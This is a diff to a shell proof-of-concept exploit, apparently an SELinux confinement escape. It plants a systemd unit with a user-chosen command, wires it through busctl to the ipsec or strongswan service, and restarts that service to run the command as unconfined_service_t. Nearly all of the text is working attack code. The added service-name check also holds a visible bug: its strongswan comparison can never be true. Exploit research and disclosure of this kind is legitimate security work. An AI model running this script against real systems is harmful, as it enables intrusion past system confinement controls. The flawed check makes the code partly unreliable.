@@ -21,7 +21,20 @@ UNIT="${UNIT_PATH}/linnemanlabs-poc-${RUN_ID}.service"
 SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"
 DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /tmp/service.out-'"${RUN_ID}"
 CMD=${CMD:-$DEFAULT_CMD}
-ipsecsvc="ipsec.service"
+
+# find ipsec service name
+svcips="$( systemctl status ipsec 2>/dev/null || true )"
+svcstrong="$( systemctl status strongswan 2>/dev/null || true )"
+if [ "${svcips}x" != "x" ];then
+  ipsecsvc="ipsec"
+else
+  if [ "${svcstrong}" == "x" ];then
+     echo "[-] did not find ipsec service name"
+     exit 1
+  fi
+  ipsecsvc="strongswan"
+fi
+echo "[*] using ipsec service: ${ipsecsvc}"
 
 # create a unit whose ExecStart is bin_t (init_t + bin_t -> unconfined_service_t), wanted by the pivot
 echo "[*] writing unit to ${UNIT}"
@@ -34,7 +47,7 @@ Type=oneshot
 ExecStart=/usr/bin/env sh -c '${CMD}'
 
 [Install]
-WantedBy=${ipsecsvc}
+WantedBy=${ipsecsvc}.service
 EOF
 
 # Link turns our /run file into a known unit - no daemon-reload needed
@@ -45,7 +58,7 @@ echo "[+] linked ${UNIT}"
 # Enable wires it into the cold pivot's .wants (pivot not loaded yet, so still no reload)
 echo "[*] enabling unit to create .wants link"
 busctl call ${SD} EnableUnitFiles asbb 1 "${UNIT}" true true
-echo "[+] enabled - ${ipsecsvc} now weakly depends on us"
+echo "[+] enabled - ${ipsecsvc}.service now weakly depends on us"
 
 # daemon-reload to pick up our dependency
 echo "[*] running daemon-reload to reload ipsec unit"
@@ -55,7 +68,7 @@ systemctl daemon-reload
 echo "[+] restarting ipsec to start our dependency"
 # we need to background cleanup operations or echo a notice about it
 # the restart will kill this script too
-systemctl restart ${ipsecsvc}
+systemctl restart ${ipsecsvc}.service
 sleep 5
 
 # Unlink our service
